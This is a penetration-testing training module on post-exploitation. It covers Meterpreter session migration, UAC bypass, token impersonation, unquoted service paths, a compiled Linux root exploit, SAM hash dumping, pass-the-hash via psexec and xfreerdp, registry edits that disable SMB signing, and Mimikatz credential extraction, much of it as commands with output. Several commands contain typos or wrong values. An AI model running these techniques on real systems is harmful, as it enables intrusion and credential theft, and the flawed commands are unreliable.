## 6.1. Introduction
Post-exploitation is the last technical stage of Penetration testing process (before reporting phase).

The Post Exploitation encompasses all the activities that the penetration tester undertakes when the target system has been compromised: determine the machine value and the network infrastructure, maintain access, gather information, and so on.

In other words, what you do, or have to do, when you get access on the target.

It is important to know that these activities are not always the same depending on what kind of access you have, what system you have compromised, how stealthy you need to be, and so on.

This means that we will run different activities, task, and tools on Windows and Linux OS.

Moreover, you should never forget about the rules of the engagement.

When running post-exploitation tasks, be sure you have the permissions, and the right to modify services, machine configurations, escalate privileges, gather sensitive information, delete logs, and so on.

###### Record your changes
  You should always keep track of actions taken against the compromised machines. This includes date and time, changes made to machines documents, services, applications, and configurations, but also private data discovered, methods used to maintain access, and so on.

  This information (containing the list of changes made) should then be included in the final report.

###### Handling Information
  All data discovered and gathered must be protected. This means that you must encrypt it on your pentesting machine, and permanently delete it once the pentest is completed.

  Even when reporting sensitive information to your client, such as a screenshot containing username or passwords, be sure to always obfuscate and mask data.

###### Maintaining Access Clean-up
  As you will see later on, one of the first steps you will run once you compromise a machine is *maintain access* or persistence. It allows you to get back on the machine whenever you want: usually a backdoor on the system.

  When using such methods, implement some type of authentication (in order to avoid others from using it) and delete everything once the pentest is complete.

###### Permanent Edits
  Another important thing you should be aware of is how to handle permanent changes on the exploited system.

  If the rule of engagements permits these edits, and if you are going to delete logs from the remote machine, be sure to back them up before actually deleting or modifying them.

###### Methodology
In order to run a thorough and complete post-exploitation phase, we propose a methodology that you can apply during your engagements.

  This is a cyclic process composed of 4 steps.
    1. Privilege Escalation and Maintaining Access
    2. Data Harvesting
    3. Internal Network Scan
    4. Exploitation of New Systems and Pivoting

  Note that this is a cyclic process due to the fact that you could discover new networks, new hosts, new targets, and then get access to them trough exploitation.

  Moreover, note that each host you compromise can store and provide information that others do not store.

  The post-exploitation phase really allows you to infiltrate an entire network instead of just a single host.

In the next section, we will analyze each step in the process and see what tools, commands, and activities a penetration tester can use in each step of the Post-Exploitation process.

## 6.2. Privilege Escalation and Maintaining Access
The first task is to perform **Privilege Escalation and Maintaining Access**.

Before actually seeing the attack methods and techniques that we can use in this phase, let's shine some light on what we mean with privilege escalation, what types of privilege escalation exist and what local exploits are (we introduced them in the previous module)

#### 6.2.1. Privilege Escalation
Privilege Escalation is an attack that exploits OS or third-party software vulnerabilities (bugs, design flaws, etc.) in order to elevate the current access (privileges) to protected resources.

  In other words, the attacker is able to gain unauthorized access to resources that (s)he is not supposed to access.

Types of Privilege Escalation:
 - Vertical <br>
    The attacker is able to move from a lower-privileged user to a higher privileged user. For example from a low-end user to administration or root user.

    Example:<br>
      On a Linux OS, the attacker is able to escalate privileges from a user (i.e. applications) and gain root privileges

 - Horizontal <br>
    The attacker keeps the same set or level of privileges, but assumes the identity of a different user (he/she does not gain any further privilege)

    Example: <br>
      On a Windows OS, the attacker is able to assume the identity on any other *Standard User* on the system. The attacker is not escalating privileges from a Standard User to an Administrator User.

###### Local Exploit
  In the previous module, we explained client-side and remote exploits, but also introduced local exploits. Now let's see what these exploits are.

  Different from the other two, local exploits require prior access on the target system. Their goal is to exploit operating systems or applications vulnerabilities in order to increase privileges on the target machine.

Now that we know more about privilege escalation and local exploit, let us go back to our pen-testing process.
  The purpose of this phase is to **provide and secure access** to the target machine with the **highest privilege** on the machine.
  In the next steps, we will assume to already have a shell or a meterpreter session on our target.

To get some basic information on the current meterpreter session, we can run `sysinfo` command.
  Let's run it and see what we get.

  As you can see, we can read about the computer name (`ELS`), the current OS running on the exploited machine (Windows), its architecture (`x64`), domain name (`workgroup`), and also the architecture of the current meterpreter session process (`x86/win32`)
  
    ```sh
    meterpreter > sysinfo
    Computer        : ELS
    OS              : Windows 7 (Build 7601, Service Pack 1)
    Architecture    : x64 (Current Process is WOW64)
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 2
    Meterpreter     : x86/win32
    ```

  As you can imagine, there are many other commands and tools that we can use to get similar or more detailed information. For example, when dealing with a Windows machine we may want to run `systeminfo`, while on Linux machine we have plenty of commands to use: `lsb_release`, `uname`, `lscpu`, and more.

  We will inspect these later on, once we get a stable and persistent connection to the exploited machine.


Once we know the type of machine we are dealing with, we can thinking about our maintaining access activities.
  In this phase we will make sure that our session is:
    - Stable (does not get dropped)
    - Privileged (can run with high privileges)
    - Persistent (through reboots)

###### 6.2.1.1 Stable
One of the main issues when you get a meterpreter session on the target, is that the end user can kill the exploited process.
  It can happen, for example, when you exploit a client-side vulnerability through the web browser and the user just closes the web browser window.

  To avoid losing the session on the target, one of the first tasks to perform is to migrate the session to another process.

**Helpful commands**
  Before seeing the migrate command, it is useful to know that giving `help` command in meterpreter, or simply typing `?` and hitting enter, will list all commands and options.

  Moreover, we have very useful meterpreter scripts that we can execute during this phase of our penetration test.
    We can list them by typing `run` and then pressing `Tab` twice.

Back to our goal of making our session stable.
To let Metasploit automatically migrate to another process, you can use the following command (on Windows machine):
  ```
  run post/windows/manage/migrate
  ```
  Example:
    ```
    meterpreter > getpid
    Current pid: 2168
    meterpreter > run post/windows/manage/migrate

    [*] Running module against ELS
    [*] Current server process: win10.exe (2168)
    [*] Migrating to 1564
    [*] Successfully migrated to process 1564
    meterpreter > getpid
    Current pid: 1564
    meterpreter >
    ```

  As you can see, the meterpreter script automatically migrated to another process. It is important to know that the process on which it will migrate will always be a process with the same privileges as the current session and that the process name is `notepad.txt`.

  If we want to see the list of all process running on the machine we can execute the `ps` command (even if it is a Windows machine)

  Tip:
    Although the previous command works just fine, we can directly run `migrate` in the meterpreter session. This time however, we have to provide the process ID or the process name we want to migrate to.

    It will not automatically create and migrate to a new process.

    ```
    meterpreter > migrate -h
    Usage: migrate <<pid> | -P <pid> | -N <name>> [-t timeout]

    Migrates the server instance to another process.
    NOTE: Any open channels or other dynamic state will be lost.
    ```

###### 6.2.1.2. Privilege Escalation
Once we have migrated our session, we can start our Post-Exploitation process.
We will first want to make our access to the remote host persistent, in order to come back any time and have access to the machine.

However, most of the operations required to achieve a persistent access, also require our shell to run with the highest privileges.

Types of Privilege Escalation Based on its OS:
  1. Windows Privilege Escalation  
      The easiest and fastest way to get higher privileges is by running `getsystem` within meterpreter.
        It will automatically find the best technique to elevate privileges.

        By default, the `getsystem` tries all available techniques to escalate privileges.
        If a technique fails, it w ill try the next one until one of the available techniques works.

        If you want to run a specific technique, simply use the `-t` option as follow:
         ```
         getsystem -t 1
         ```

        Important:
          Notice that depending on the current privileges on the machine, the `getsystem` command may fail.
            For example, if you use this technique on systems with User Account Control (UAC) enabled (Windows Vista+), it would not work as well as systems like Windows XP.

            We need to use other techniques to get past this protection and then be able to successfully obtain system privileges.

          Moreover, you should be aware that `getsystem` works only against Windows OS.
          For different OS, you will have to rely on different Metasploit modules.

          If you want to know which modules Metasploit offers, you can navigate the `exploit/[OS]/local` path. We will see some of them later in the module.

        When UAC is enabled on the remote system, `bypassuac` is one of the modules we can use to bypass it.
          First of all, we can verify if UAC is enabled by running the module `post/windows/gather/win_privs`.

          If in the result the *UAC Enabled* column is set to true, it means that the remote system has the UAC enabled.

          As we can see in the following snapshot, UAC is enabled and we do not have Admin or System privilege on the machine. This means that running `getsystem` will most likely fail.
            ```
            meterpreter > run post/windows/gather/win_privs

            Current User
            ============

            Is Admin    Is System   UAC Enabled   Foreground ID   UID
            --------    ---------   -----------   -------------   ---
            False       False       True          1               "els\\els"

            Windows Privileges
            ==================

            Name
            ----
            SeChangeNotifyPrivilege
            SeShutdownPrivilege
            SeUndockPrivilege
            ```
          What we can do then is use some of the modules offered by Metasploit to bypass the UAC protection mechanism. We can list them by simply searching the string `bypassuac`:
            ```
            msf exploit(handler) > search bypassuac

            Matching Modules
            ================

              Name                                      Disclosure Date   Rank  Description
              ----                                      ---------------   ----  -----------
              exploit/windows/local/bypassuac           2010-12-31        excellent  Windows Escalate UAC Protection
              exploit/windows/local/bypassuac_injection 2010-12-31        excellent  Windows Escalate UAC Protection
              exploit/windows/local/bypassuac_vbs       2015-08-22        excellent  Windows Escalate UAC Protection
            ```

          The steps we will have to do are very easy:
            1. Select the `bypassuac_vbc` module, since it is the newest module
            2. Set the session ID on which the module will be executed
            3. Run the module

          If the module completes, we will get a new meterpreter session with highest privileges. Remember that this is a bypass, so UAC will still be enabled on  the target.

          The following summarized the step:
            ```
            msf exploit(handler) > user exploit/windows/local/bypassuac_vbs
            msf exploit(bypassuac_vbs) > sessions

            Active sessions
            ===============

              Id  Type                    Information     Connection
              --  ----                    -----------     ----------
              6   meterpreter x86/win32   elsels @ELS     192.168.102.147:4455 -> 192.168.102.157:1039 (192.168.102.157)

            msf exploit(bypassuac_vbs) > set SESSION 6
            SESSION => 6
            msf exploit(bypassuac_vbs) > exploit
            ```

          If the exploit succeed, we will obtain a new meterpreter session that has higher privileges on the machine. As we can see, running `win_priv` prints out we are Admin on it.
            ```
            meterpreter > run post/windows/gather/win_privs

            Current User
            ============

            Is Admin    Is System   UAC Enabled   Foreground ID   UID
            --------    ---------   -----------   -------------   ---
            True        False       True          1               "els\\els"
            ```

          We now have administrator privileges on the machine, but we do not yet have the highest privileges on the machine.
            What we can do is run `getsystem` once again in this new meterpreter session. This time it will work.
              ```
              meterpreter > getsystem
              ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
              meterpreter > getuid
              Server username: NT AUTHORITY\SYSTEM
              meterpreter > sysinfo
              Computer        : ELS
              OS              : Windows 7 (Build 7601, Service Pack 1)
              Architecture    : x64 (Current Process is WOW64)
              System Language : en_US
              Domain          : WORKGROUP
              ```

          **Incognito**
            A very powerful Meterpreter extension that we can use in this phase is [Incognito][https://www.gracefulsecurity.com/privesc-stealing-windows-access-tokens-incognito/].
            It was a standalone tool used to demonstrate security issues affecting [Windows tokens][https://technet.microsoft.com/en-us/library/cc759267(v=ws.10).aspx], but due to its functionality and features, it has been integrated in Metasploit.

            Thanks to incognito, we can impersonate other valid user tokens on that machine and became that user. The best thing is that we do not need to know or crack passwords to do this.

            As you can imagine, being able to switch from one user to another gives us the possibility to access different local or domain resources.

            Loading incognito is very simple. Once we have a meterpreter session (better with system privileges), we can run the following command to load the incognito extension
              ```
              meterpreter > use incognito
              Loading extension incognito...success.

              Incognito Commands
              ==================
                  Command             Description
                  -------             -----------
                  add_group_user      Attempt to add a user to a global group with all tokens
                  add_localgroup_user Attempt to add a user to a local group with all tokens
                  add_user            Attempt to add a user with all tokens
                  impersonate_token   Impersonate specified token
                  list_tokens         List tokens available under current user context
                  snarf_hashes        Snarf challenge/response hashes for every token
              ```

            Now we can list all available tokens with `list_tokens` or impersonate other user with `impersonate_token`:
              ```
              meterpreter > getuid
              Server username: NT AUTHORITY\SYSTEM
              meterpreter > list_tokens -u

              Delegation Tokens Available
              ================================================
              els\els
              els\user
              NT AUTHORITY\LOCAL SERVICE
              NT AUTHORITY\NETWORK SERVICE
              NT AUTHORITY\SYSTEM

              Impersonate Tokens Available
              ================================================
              NT AUTHORITY\ANONYMOUS LOGON
              ```

          **Unquoted Service Paths**
            [Unquoted Service Paths][https://cwe.mitre.org/data/definitions/428.html] are another method we can use for either persistence on a Windows target, or for escalating our privileges, depending on the circumstance.

              With Unquoted Service Paths vulnerabilities, we are able tot abuse the way that Windows searches for executables belonging to a service.

              In many cases, we can abuse this "search order" to obtain persistence to a system as the currently logged-on user, or escalate our privileges to SYSTEM.

                This issues arises when a Windows service has been configured with a path to a service binary which is unquoted (i.e. `C:\Users` instead of `"C:\Users"`), and additionally contains spaces in its path.

              When the path to the service binary is unquoted, as in the example service below, Windows will search for the service executable in the following order (i.e. : `C:\Program Files (x86)\Canon\IJ Scan Utility\SETEVENT.exe`):
                1. `C:\Program.exe`
                2. `C:\Program Files (x86)\Canon\IJ.exe`
                3. `C:\Program Files (x86)\Canon\IJ Scan Utility\SETEVENT.exe`

                this gives us two options in regard to an executable we can drop, and in which directory. In this case `C:\Program.exe` and `C:\Program Files (x86)\Canon\IJ.exe`

              Now, assuming that our current user would have the necessary permissions to write to the `C:\root`, or the Program Files `Canon` directory, we could place our own `Program.exe` or `IJ.exe` files respectively, and when the service starts, it would launch our executable, rather than the original `SETEVENT.exe` executable.

              Since the affected service runs a SYSTEM, we could have a SYSTEM shell in the case the system were to be rebooted, or the affected service restarted; In an example where our payload executable initiates a reverse TCP shell for instance.

            There are several different ways we can check for the existence of Unquoted Service Paths.
              We can do it either manually, or using third-party scripts or tools.

              One thing we can do is use the WMI Command line tool ([wmic][https://msdn.microsoft.com/en-us/library/aa394531(v=vs.85).aspx]) to query for all services and paths, specially searching for unquoted paths with the following command line:
                ```
                C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |finder /i /v """
                ```

              We can also use the `sc` ([Service Control][https://ss64.com/nt/sc.html]) command with the `qc` (Show Config) option to query a specific service, and manually check for an unquoted path:
                ```
                C:\>sc qc CIJSRegister
                [SC] QueryServiceIconConfig SUCCESS

                SERVICE_NAME: CIJSRegister
                        TYPE                : 10   WIN12 OWN PROCESS
                        START_TYPE          : 2    AUTO_START
                        ERROR_CONTROL       : 0    IGNORE
                        BINARY_PATH_NAME    : C:\Program Files (x86)\Canon\IJ Scan Utility\SETEVENT.exe
                        LOAD_ORDER_GROUP    :
                        TAG                 : 0
                        DISPLAY_NAME        : Canon IJ Scan Utility register event
                        DEPENDENCIES        :
                        SERVICE_START_NAME  : LocalSystem
                ```

              Metasploit also contains a module we can use to automatically exploit Unquoted Path-vulnerable instances of services as well.
                ```
                msf> use exploit/windows/local/trusted_service_path
                ```
                (See Video-64)

            (See Video-63)


  2. Linux Privilege Escalation
      Until now, we focus our privilege escalation activities on Windows OS. In the next slides, we will see how to achieve the same goals against Linux machines.

      Once again, we suppose that we already exploited the target machine and that we already have a shell or a session on it.

      Although Metasploit offers some privilege escalation modules for Linux OS, the best way to proceed is by getting information about the current OS and then searching for publicly available exploits.

      Notice that privilege escalation exploits are very OS specific, so information about the OS and the applications installed on the machine may results in very useful information to narrow down your search.

      Let's see an example of how we can escalate privileges on the following Linux machine. We already have a meterpreter session on it and we need to know more information about the OS running on it.
        ```
        meterpreter > sysinfo
        Computer      : ubuntu
        OS            : Linux ubuntu 3.16.0-30-generic #40-14.04.1-Ubuntu SMP Thru Jan
        Architecture  : i686
        Meterpreter   : x86/linux
        meterpreter > getuid
        Server username: uid=1000, gid=1000, euid=1000, suid=1000, sgid=1000
        meterpreter > run post/linux/gather/enum_system

        [+] Info:
        [+]     Ubuntu 14.04.2 LTS

        [+]     Module running as "els" user
        ```

        From the previous snapshot, we can see that we have access to a Linux Ubuntu 14.04.2 LTS (32bit) machine. Moreover we can see we are actually running under the user named `els`.

      Our goal is to obtain highest privileges on the machine, which in this case means getting access as root. The most basic thing we can do is searching online for publicly available privilege escalation exploit.

        If we check our OS with + the keyword `privilege escalation`, there seems to be something available for our current system.

        Most of the time, you will find the source code of the exploit and you will have to compile it.

        If the remote machine has everything you need you can compile the exploit directly on the target, otherwise you will have to compile it on your own machine. In the latter case, be aware to use the correct configuration and select the right architecture.

        **Compile on the target**
          Let us suppose the target machine has everything we need, in other words, `gcc` is installed and we can compile the file.
          What we can do is upload the source file on the target, get a shell on it  through meterpreter and then compile the exploit.

          In order to upload the file, we just need to use the upload command that meterpreter already implements. We need to provide the local path of the exploit and then the remote path, where to upload the file:
            ```
            meterpreter > upload /home/stduser/Downloads/37292.c
            [*] uploading  : /home/stduser/Downloads/37292.c -> .
            [*] uploaded   : /home/stduser/Downloads/37292.c -> ./37292.c
            meterpreter > ls
            Listing: /home/els/Documents
            ============================

            Mode              Size  Type    Last Modified               Name
            ----              ----  ----    -------------               ----
            100664/rw-rw-r--  5123  fil     2016-02-24 12:05:21 -0500   37292.c
            ```

          Now let's get a terminal session with the `shell` command and then compile the source with `gcc`. The compiled exploit will be named exploit.
            ```
            meterpreter > shell
            Process 6010 created
            Channel 1 created.
            $ ls
            37292.c
            $ gcc 37292.c -o exploit
            $ ls -l
            total 20
            -rw-rw-r--  1 els els   5123 Feb 24 09:05 37292.c
            -rw-rwxr-x  1 els els  12149 Feb 24 09:07 exploit
            ```

          The last step now is to run the exploit.
          We simply do this with the following command : `$ ./exploit`
          As we can see, we are now running as root.

        **Compile on Our Machine**
          Supposing the target machine does not have `gcc`, we cannot compile the exploit there and we have to do it locally.

          Since the 2 machines are a bit different (our OS is 64-bit and the target is 32-bit), we need to set `gcc` parameters accordingly. Notice that installing all the required packages is outside the scope of this course, but you can find many resources online.

          The following is our machine architecture:
            `Linux els 4.0.0-kali1-amd64 #1 SMP Debian 4.0.4-1+kali2 (2015-06-03) x86_64 GNU/Linux`

          In order to compile the exploit we will use the following command:
            ```
            stduser@els:~/lin_exp$ gcc -m32 -o linux_priv_esc 37292.c
            stduser@els:~/lin_exp$ ls
            37292.c linux_priv_esc
            stduser@els:~/lin_exp$
            ```

          Now that we have the compiled version of the exploit, we can upload it via meterpreter with the `upload` command.
            ```
            meterpreter > upload /home/stduser/lin_exp/linux_priv_esc
            [*] uploading  : /home/stduser/lin_exp/linux_priv_esc -> .
            [*] uploaded   : /home/stduser/lin_exp/linux_priv_esc -> ./linux_priv_esc
            meterpreter > ls
            Listing: /home/els/Documents
            ============================

            Mode              Size    Type    Last modified             Name
            ----              ----    ----    -------------             ----
            100664/rw-rw-r--  9060    fil     2016-02-25 05:14:18 -0500 linux_priv_esc
            ```

          As we can see in the previous output, we also need to change the permission on the file and make it executable.

          We will spawn a shell on the machine and run everything from there.
            ```
            meterpreter > shell
            Process 6440 created.
            Channel 1 created.
            $ chmod +x linux_priv_esc
            $ whoami
            els
            $ ./linux_priv_esc
            spawning threads
            mount #1
            mount #2
            child threads done
            /etc/ld.so.preload created
            creating shared library
            # whoami
            root
            #
            ```

      What we have seen so far are privilege escalation techniques that exploit some kind of vulnerability in OS implementations, but there are other different ways we can get higher privileges on the machine.

      For example we may try to gather, dump or crack credentials related to administrators or root accounts.

      Another way to escalate privileges can be achieved by exploring permissions on process running on the machine.
        If there are services or processes running with higher privileges, there may be the possibility to inject malicious code in one of them and then be able to run commands or write data on the system with their privileges.

      Moreover, instead of injecting code directly in the application, you may also be able to escalate privileges by replacing files like DLLs or executables.
        This may happen if you have the right to write or edit files used by a service or process. You can replace these with your own version of the file and force the application to re-run and execute your code.

        Think about a service that is running with *system privileges* and its executable is stored in a folder on which we have write permissions.

        We can use `msfvenom` to create your payload (or inject it with tools like `Shellter`, `BDF`, and so on). After that we can replace the file with the one just created and force the service to start (for example with DoS attacks).

###### 6.2.1.3. Maintenance Access
So far we focused on how to escalate privileges on a compromised machine. Once we have higher privileges, we can move on to the next step: *Maintaining Access*

The purpose of this phase is to make our presence on the machine persistent - creating a backdoor readily available for later use.

We can use different techniques and tools to achieve this goal. Some are stealthier than others and some are only relevant to a particular OS.

We will study a few different methods to use during this phase, but remember that you can always improve and tweak them to your needs.

The following diagram summarizes the techniques we are going to use (see img-86):
  ```
                          Maintaining Access
                    ______________|______________
                    |             |             |
              Password Hash   Backdoor      New Users
          __________|___________                |
          |                    |                |
    Pass the Hash        Crack the Hash         |
          |                    |                |
           Services Such as RDP, VNC, Telnet ...
  ```

As you probably noticed, some of the techniques (such as RDP or VNC) require services for the connection. Before we start exploring them, note that there are different situations that you can face. For example:
    - Services are already active and we need credentials to establish connection
    - No services are in place: we need to activate them
    - For new users, we need to add them for each service (if they are already active, otherwise we have to activate them)

Let us start with one of the easiest techniques: **recovering the password hash**
1. Password Hash
  We are assuming that we already have a meterpreter session on the target machine (Windows 8.1) and that the session is running with the highest privileges (`SYSTEM`)

  The easiest way to dump the hashes from the [SAM Database][https://technet.microsoft.com/en-us/library/cc756748(v=ws.10).aspx] is by running the command `run hashdump`:
    ```
    meterpreter > run hashdump
    [*] Obtaining the boot key...
    [*] Calculating the hboot key using SYSKEY e9611aec85bc393d8a603ad3a7528e52
    [*] Obtaining the user list and keys..
    [*] Decrypting user keys...
    [*] Dumping password hints...

    No user with password hints on this system

    [*] Dumping password hashes..

    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d13ae931b73c59d7e0c089c0:::
    els:501:aad3b435b51404eeaad3b435b51404ee:d9e6bffa796d2688ac52a49b74132a4f:::
    Guest:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16cfe0d16ae931b73c59d7e0c089c0:::
    ```

    As you have noticed we recovered all accounts and password hashes from the  target machine (Windows 8.1) by running as `SYSTEM`.

    Notice that depending on the OS version, we may be able to gather this information with even lower privileges, such as administrator accounts.

      In the following screenshot, we can see that running the same command with administrative privileges does not work.
      Indeed we get `Access denied` error.
        ```
        [*] Obtaining the boot key...
        [*] Calculating the hboot key using SYSKEY a6e1086fb186a10be86a80....
        [-] Meterpreter Exception: Rex::Post::Meterpreter::RequestError stdapi_registry_open_key: Operation failed: Access is denied
        [-] This script requires the use of a SYSTEM user context (hint: migrate service process)
        ```

      As metasploit suggests, we can try to migrate to a service process and re-run the command.

    Note that if you try running `hashdump` directly, sometimes you may get the message `priv_passwd_get_sam_hashes: Operation failed:The parameter is incorrect`.
    This happens even with `NT_AUTHORITY\SYSTEM` privileges:
      ```
      meterpreter > hashdump
      [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
      meterpreter > getuid
      Server username: NT AUTHORITY\SYSTEM
      meterpreter >
      ```

    To bypass this error you have 2 options:
      1. Execute `run hashdump`; or
      2. Migrate to different process

  Now that we have password hashes we can move in two different directions.
  Let's see the first one:
  - Pass the Hash
    If we are not able to crack the hashes, we have to uses other techniques to ensure access on the target machine.

    Pass the hash is a technique that allows us to connect to a remote machine, by the means of the hash without using the actual plain-text password.
      This technique can be used to connect back into the exploited machine, or to exploit other machines that share the same account credentials.

      Pass the hash is a technique discovered and [published][http://www.securityfocus.com/bid/233/discuss] in 1997 by Paul Ashton that allows an attacker to use LM and NTLM hashes to authenticate to a remote host.

      As you can imagine, if we are to gather administrator hashes, we can mount a pass the hash attack on all the machine in the network.
      This is dangerous since the same accounts (**username** and **password_hash**) can be used on multiple machines.

    There are different tools and scripts freely available online that we can use to exploit this vulnerability.
      What we are going to use in the next slide is a Metasploit module called `psexec`, that given a username and a password (or its hash), is able to execute an arbitrary payload.

    Let us see how to use the previous gathered hashes in order to obtain a shell on the remote system.

    The Metasploit module we are going to use is stored at the following path:
      ```
      use exploit/windows/smbpsexec
      ```

    Once selected, we will just need to set the password hash (`SMBPass`) the username (`SMBUser`), the remote host IP address (`RHOST`) and then configure the payload options.

    Notice that the attack only works if we use an administrator account.
    Let's once again get the password hashes from the session that we already have on the password hashes from the session that we already have on the target machine and let's copy the username and password hash.
      ```
      meterpreter > hashdump
      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d13ae931b73c59d7e0c089c0:::
      els:501:aad3b435b51404eeaad3b435b51404ee:d9e6bffa796d2688ac52a49b74132a4f:::
      Guest:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16cfe0d16ae931b73c59d7e0c089c0:::
      ```

    Our username will be `els` while the password hash is:
      ```
      aad3b435b51404eeaad3b435b51404ee:d9e6bffa796d2688ac52a49b74132a4f
      ```

    Now we can configure the `psexec` module as follows and run the attack:
      ```
      msf exploit(psexec) > set SMBPASS
      aad3b435b51404eeaad3b435b51404ee:d9e6bffa796d2688ac52a49b74132a4f
      SMBPASS => aad3b435b51404eeaad3b435b51404ee:d9e6bffa796d2688ac52a49b74132a4f
      msf exploit(psexec) > set SMBUSER els
      SMBUSER => els
      msf exploit(psexec) > set RHSOT 192.168.102.155
      RHOST => 192.168.102.155
      msf exploit(psexec) > exploit
      ```

    If the attack works, we should be able to obtain a new meterpreter session:
      ```
      msf exploit(psexec) > exploit

      [*] Started reverse TCP handler on 1912.168.102.147:4444
      [*] Connecting to the server...

      meterpreter > sysinfo
      Computer         : WIN-K75TDEUEPA5
      OS               : Windows 8.1 (Build 9600)
      Architecture     : x64 (Current Process is WOW64)
      System Language  : en_US
      Domain           : WORKGROUP
      ```

    Sometimes being in the local administrators group is not enough to pass-the-hash, and depending on the Windows OS system configuration and version, come changes may be required on the target system in order for this to work.

      The issue typically presents itself when trying to pass-the-hash from an account which isn't an "actual" administrator (RID-500), but rather, from an account that is in the Administrators group.

      For example, if we try the psexec module from a session where our current user is in the Administrator group, but not an "actual" Administrator, and we get a `STATUS_ACCESS_DENIED` (*Command=117 WordCount=0*) error, this is a good indication that registry changes may be required on the target host in order for a successful pass-the-hash attack.
        ```
        msf exploit(psexec) > exploit
        [*] Started reverse TCP handler on 1912.168.102.147:4444
        [*] Connecting to the server...
        [*] Authenticating to 192.168.102.155:445 as user 'els'...
        [-] Exploit failed [no-access]: Rex:Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_ACCESS_DENIED (Command=117 WordCount=0)
        ```

      The two registry entries needed on the target for this to be successful are:
        - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`<br>
          Add a new **DWORD** (32-bit) named **LocalAccountTokenFilterPolicy** and set its value to **1**
        - `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters` <br>
          Add a new **DWORD** (32-bit) named **RequireSecuritySignature** and set its value to **0**

      Nonetheless, if we already have a session on the target as an administrator, and would like to "modify" those registry settings to help us with the attack, we can do so with a couple simple powershell one-liners from a Powershell shell:
        ```
        PS> Set-ItemProperty -Path
        HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFitlerPolicy -Value 1 -Type DWord
        ```
        ```
        PS> Set-ItemProperty -Path
        HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters -Name LocalAccountTokenFitlerPolicy -Value 1 -Type DWord
        ```

      Alternatively, we could use the "[reg][https://ss64.com/nt/reg.html]" command to accomplish the same:
        ```
        C:\ reg add
        "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" \v LocalAccountTokenFilterPolicy /t REG_WORD /d 1 /f
        ```
        ```
        C:\> reg add
        "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" \v RequireSecuritySignature /t REG_WORD /d 0 /f
        ```

      The previous registry changes, particularly the "**LocalAccountTokenFilterPolicy**" setting, essentially allow non RID-500 user accounts (users in the local administrator group for instance) to successfully pass-the-hash in some cases.

      More in-depth information these quirks in regard to passing the hash on more current versions of Microsoft OS can be found [here][https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/]

      In addition to the traditional methods of pass-the-hash techniques, if we find ourselves in a situation where we have obtained an NTLM hash, and would like to use it to log onto a Remote Desktop service without the need to provide actual credentials, we can do that with RDP client available for Linux known as `xfreerdp`, and comes preinstalled on Kali Linux.

        Using the `/pth` switch and xfreedp, we can pass an NTLM hash to a remote desktop server with the following command:
        ```
        # xfreerdp /u:admin /d:foocorp /pth:
        9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41 /v:172.16.22.119
        ```

  - Crack the Hash <br>
    Once we dump the hashes, we can try to crack them and obtain passwords that are used to login on active services running on your target machine.

    Here we will not deal with password cracking, since it is covered more in depth in the *System Security Section*.

  - Mimikatz <br>
    Before seeing how to work with services and users, it is important to know that we may be able to retrieve plaintext password from the exploited machine, thanks to [Mimikatz][https://github.com/gentilkiwi/mimikatz]

    Mimikatz is a tool able to extract plaintext password, Kerberos tickets, perform pass-the-hash attacks and much more.

    Although it is a stand-alone tool, Metasploit implements an extension that allows us to use its feature directly from the Meterpreter session.

    We will briefly see it here in order to gather credentials and then we will inspect it more in detail later in this module.

    In order to start using *mimikatz* and get the best out of it, it is important to have the current meterpreter session running on a 64-bit process. This allows it to successfully load all *mimikatz* features without any issues.

    We have already seen how to check the current meterpreter architecture, but we will briefly recap it in the next section.
      We can verify this by running `sysinfo`:
        ```
        meterpreter > sysinfo
        Computer         : ELS
        OS               : Windows 7 (Build 760, Service Pack 1).
        Architecture     : x64 (Current Process is WOW64)
        System Language  : en_US
        Domain           : WORKGROUP
        Logged On Users  : 4
        Meterpreter      : x86/win32
        ```

      As we can see, we are currently running meterpreter on a 32 bits process

      We have to migrate into a 64 bit process.
      Moreover, we need a process with the same privileges of the current session.
      Since we are currently running on `SYSTEM` privileges, we can list them with the following command:
        ```
        meterpreter > ps -A x86_64 -s
        Filtering on arch...
        Filtering on SYSTEM processes...

        Process List
        ============

        Description:

      Now we have to select one of the process listed and run `migrate [PID]`
      After that we will run on a 64-bits process and we will still have SYSTEM privileges on the machine.
        ```
        meterpreter > migrate 448
        [*] Migrating from 1668 to 448...
        [*] Migration completed successfully.
        meterpreter > getuid

        ```

      We can then load mimikatz and start using its feature to gather palintext credentials. The command are very simple: we first run `load mimikatz` and then we print the help manual to list the new commands available:
        ```
        meterpreter > load mimikatz
        Loading extension mimikatz...success.
        ```
        ```
        Mimikatz Commands
        =================

          Command           Description
          -------           -----------

          livessp           Attempt to retrieve livessp creds
          mimikatz_command  Run a custom command
        ```

      As we can see from the commands listed, we can try to retrieve credentials from different services and protocols. Here we will try to retrieve the credentials with [wdigest][https://technet.microsoft.com/en-us/library/cc778868(v=ws.10).aspx]:
        ```
        meterpreter > wdigest

        0;378766    NTLM       els           els            pwdels
        ```

      To get the best out of mimikatz, we suggest you read the tool wiki [here][https://github.com/gentilkiwi/mimikatz/wiki] and test its modules and commands.
        ```
        meterpreter > mimikatz_command -f *::
        Module : '*' introuvable

        Modules disponibles :
                        - Standard

               service  - Manipulation des
             privilege  - Manipulation des
        ```

      As you will see, you can run many different tasks and operations that will reveal very useful information.

  - Windows Credentials Editor
